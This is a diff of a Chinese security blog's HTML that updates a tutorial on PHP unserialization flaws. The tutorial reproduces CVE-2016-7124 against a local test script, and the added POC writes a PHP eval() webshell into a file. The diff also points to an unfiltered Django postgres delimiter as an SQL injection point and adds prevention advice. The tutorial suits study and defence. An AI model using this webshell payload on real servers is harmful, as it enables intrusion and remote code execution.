@@ -124,7 +124,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -490,7 +490,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-07 09:22:51" itemprop="dateModified" datetime="2021-04-07T09:22:51+08:00">2021-04-07</time>
+                <time title="修改时间：2021-04-07 09:30:12" itemprop="dateModified" datetime="2021-04-07T09:30:12+08:00">2021-04-07</time>
               </span>
 
           
@@ -517,7 +517,7 @@
 <p><img src="/2021/03/29/Django-sql/10.jpg"></p>
 <p><img src="/2021/03/29/Django-sql/11.jpg"></p>
 <p>Value参数会被添加到sql参数列表，然后被Django内置的过滤机制过滤，来防注。</p>
-<p>如何导致SQL 注入：</p>
+<p>如何导致SQL 注入：<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib">contrib</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres">postgres</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres/aggregates">aggregates</a>/general.py</p>
 <p><img src="/2021/03/29/Django-sql/14.jpg"></p>
 <p>delimiter没有任何过滤，我们可以通过闭合单引号来利用注入</p>
 <p><img src="/2021/03/29/Django-sql/4.png"></p>
@@ -856,7 +856,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/24/php-unserialize/" class="post-title-link" itemprop="url">PHP反序列化原理及各种利用方式</a>
+            <a href="/2021/03/24/php-unserialize/" class="post-title-link" itemprop="url">理解PHP反序列化原理及利用</a>
         </h2>
 
         <div class="post-meta">
@@ -873,7 +873,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-06 21:55:28" itemprop="dateModified" datetime="2021-04-06T21:55:28+08:00">2021-04-06</time>
+                <time title="修改时间：2021-04-13 14:07:25" itemprop="dateModified" datetime="2021-04-13T14:07:25+08:00">2021-04-13</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -906,7 +906,9 @@
 <li>php源码同python一样是由c所写</li>
 <li>可以序列化的对象都可以反序列化</li>
 <li>序列化只序列化对象的属性，不序列化方法</li>
+<li>如果希望PHP调用魔术方法，必须首先在类中定义，否则PHP不会执行未创建的魔术方法。</li>
 <li>序列化后包括，类为object,类长度为4，名为test,包含3个属性：<br>第一个属性为string,长度为10，名为testflag;值长度为6，名为active；因为<strong>prvate</strong>,故而序列化后，原名test被更改<br>第二个同上; 因为<strong>protected</strong>，故而序列化后,原名前加*<br>第三个同上; 因为<strong>public</strong>，故而序列化后,原名不变<br><img src="/2021/03/24/php-unserialize/1.jpg"><br>private序列化后格式：%00类名%00属性名<br><img src="/2021/03/24/php-unserialize/2.png"><br>protected序列化后格式：%00*%00<br><img src="/2021/03/24/php-unserialize/3.png"></li>
+<li>可能有人会问为什么要序列化，因为要使复杂数据写入进程间内存、文件或数据库更容易。所以采取序列化，将复杂的数据结构(对象及其属性)转换成“更扁平”的格式，作为字节顺序流传输。而反序列化将字节流还原为原始对象，方便与网站逻辑交互。</li>
 </ol>
 <h3 id="2-魔术方法"><a href="#2-魔术方法" class="headerlink" title="2. 魔术方法"></a>2. 魔术方法</h3><p>魔术方法(Magic methods)：以两个下划线__开头，包括：<br>(1)__construct()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)<br>(2)__sleep()，执行serialize()时，先会调用这个函数<br>(3)__wakeup()，unserialize()时，先会调用这个函数<br>(4)__destruct()，类的析构函数，当对象被销毁时会自动调用<br>(5)__toString()，类被当成字符串时的回应方法。当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(6)__get()，获得一个类的成员变量时调用。当从不可访问的属性读取数据<br>(7)__call()，在对象中调用一个不可访问方法时调用<br>(8)__callStatic()，用静态方式中调用一个不可访问方法时调用<br>(9)__set()，设置一个类的成员变量时调用</p>
 <hr>
@@ -930,15 +932,17 @@
 <p>shield.php,类中存在属性$file,且file会调用__construct方法。所以我们利用file即可。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once (&#39;shield.php&#39;);</span><br><span class="line">$x &#x3D; new Shield();</span><br><span class="line">isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">if (!empty($g))&#123;</span><br><span class="line">    $x &#x3D; unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line">echo $x-&gt;readfile();</span><br></pre></td></tr></table></figure>
 <p>包含shield.php,new实例时会调用__construct()方法，然后接收用户的反序列化并输出。<br>payload:直接构造序列化对象作为file的内容，O:6:”Shield”:1{s:4:”file”;s:8:”ctf.php”;}</p>
-<h2 id="0x02-php绕过-wakeup：-CVE-2016-7124"><a href="#0x02-php绕过-wakeup：-CVE-2016-7124" class="headerlink" title="0x02 php绕过__wakeup： CVE-2016-7124"></a>0x02 php绕过__wakeup： CVE-2016-7124</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>执行unserialize前，会先调用__wakeup()方法, 但是当序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。</p>
+<h2 id="0x02-php绕过-wakeup：-CVE-2016-7124"><a href="#0x02-php绕过-wakeup：-CVE-2016-7124" class="headerlink" title="0x02 php绕过__wakeup： CVE-2016-7124"></a>0x02 php绕过__wakeup： CVE-2016-7124</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>执行unserialize恢复对象时，会先调用__wakeup()成员函数, 但是当序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。</p>
+<p>漏洞概述: wakeup()魔法函数被绕过,导致执行了一些非预期效果的漏洞<br>漏洞原理: 当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</p>
 <h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><ul>
 <li><p>漏洞影响版本：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
 </li>
 <li><p>复现环境</p>
 <p>php5.4.5nts+apache+mysql（phpstudy）</p>
+<p>phpinfo环境搭建成功，其中test.php,233.php均在www目录下。</p>
 </li>
 <li><p>编写测试脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is __wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is __destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>接收参数s，将其反序列化后输出属性name的值。</p>
 </li>
 </ul>
@@ -950,10 +954,20 @@
 <p>构造payload将传入的序列化数据的对象变量个数由1加至2，绕过__wakeup方法执行。–反序列化数据失败无法创建对象的原因</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/03/24/php-unserialize/6.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>页面只执行__destruct方法，没有输出name,是因为反序列化数据失败，导致无法创建对象。</p>
+<p>修改测试脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line"></span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is wakeup&lt;br&gt;&quot;;</span><br><span class="line">        foreach(get_object_vars($this) as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">            $this-&gt;$k &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is destruct&lt;br&gt;&quot;;</span><br><span class="line">        $fp &#x3D; fopen(&quot;D:\\phpstudy\\PHPTutorial\\WWW\\233.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;name);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>具体复现各位看官自己尝试</p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1]深入理解PHP反序列化漏洞:<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br>[2]CVE-2016-7124——php绕过__wakeup():<a target="_blank" rel="noopener" href="http://www.cl4y.top/521/">http://www.cl4y.top/521/</a></p>
+<p>构造POC写入一句话木马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test.php?s&#x3D;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:29:&quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/24/php-unserialize/8.png"></p>
+<p>此时调用destruct方法会将name参数写入233.php文件，但windows弹窗自动禁止。</p>
+<p>一句话木马被写入233.php。</p>
+<h2 id="0x03-如何防止"><a href="#0x03-如何防止" class="headerlink" title="0x03 如何防止"></a>0x03 如何防止</h2><p>一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。</p>
+<p>在开始反序列化之前，必须进行检查。如果确实需要反序列化来自不受信任来源的数据，请采用措施以确保数据未被篡改。如可以使用数字签名来检查数据的完整性。</p>
+<p>避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 深入理解PHP反序列化漏洞:<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/">https://www.k0rz3n.com/2018/11/19/</a><br>[2] CVE-2016-7124——php绕过__wakeup():<a target="_blank" rel="noopener" href="http://www.cl4y.top/521/">http://www.cl4y.top/521/</a></p>
 
       
     </div>
@@ -1128,7 +1142,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
